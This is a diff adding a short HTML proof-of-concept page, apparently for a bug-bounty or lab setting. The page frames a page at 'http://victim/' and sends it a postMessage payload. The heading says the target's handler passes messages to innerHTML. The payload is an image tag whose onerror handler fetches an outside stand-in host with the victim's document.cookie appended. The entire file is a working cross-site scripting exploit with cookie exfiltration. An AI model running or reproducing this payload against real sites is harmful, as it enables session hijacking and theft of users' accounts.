@@ -1,0 +1,20 @@
+<html>
+    
+    <body>
+        <h2>Loading in a frame and post message! Handler automatically parses using InnerHTML</h2>
+        
+        <iframe src='http://victim/' id='vulnpage' onload='funcloca()'>
+            
+        </iframe>
+        <script>
+            function funcloca(){
+                var w = document.getElementById('vulnpage').contentWindow
+                w.postMessage('<img src=x onerror=fetch("https://exfiltrate.site/cookie="+document.cookie)>',"*")
+                
+            }
+            
+        </script>
+        
+    </body>
+    
+</html>
